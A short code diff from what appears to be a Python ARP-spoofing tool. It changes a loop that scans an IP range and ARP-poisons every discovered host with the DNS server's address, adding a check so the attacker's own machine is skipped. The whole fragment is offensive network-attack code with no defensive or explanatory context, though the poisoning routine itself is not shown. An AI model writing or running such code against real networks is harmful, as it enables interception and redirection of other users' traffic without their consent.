@@ -39,10 +39,11 @@ class Arp:
         self.first_call = first_call
         self.get_hosts(ip_range)
         for host in self.nm.all_hosts():
-            try:
-                self.poison(host, self.nm[host]['addresses']['mac'], dns_ip, dns_mac)
-            except KeyError:
-                continue
+            if not host == str(socket.gethostbyname(socket.gethostname())): # Don't poison yourself
+                try:
+                    self.poison(host, self.nm[host]['addresses']['mac'], dns_ip, dns_mac)
+                except KeyError:
+                    continue
         # Return true if poisoning was successful
         return True
 
